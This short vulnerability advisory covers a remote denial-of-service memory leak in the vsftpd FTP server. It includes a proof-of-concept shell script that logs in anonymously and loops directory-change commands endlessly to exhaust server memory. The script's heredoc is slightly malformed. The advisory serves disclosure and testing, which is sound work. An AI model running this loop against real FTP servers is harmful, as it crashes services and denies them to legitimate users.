source: http://www.securityfocus.com/bid/29322/info


The 'vsftpd' FTP server is prone to a remote denial-of-service vulnerability because it fails to free allocated memory.

Successfully exploiting this issue allows remote attackers to crash the affected application, denying service to legitimate users. 

# echo deny_file=foo >> /etc/vsftpd/vsftpd.conf
# service vsftpd restart

$ cat > memtest.sh <<EOF
 EOF
#!/bin/bash
echo USER anonymous
echo PASS foo@bar.com

while [ 1 ]; do
        echo CWD pub
        echo CWD ..
done
EOF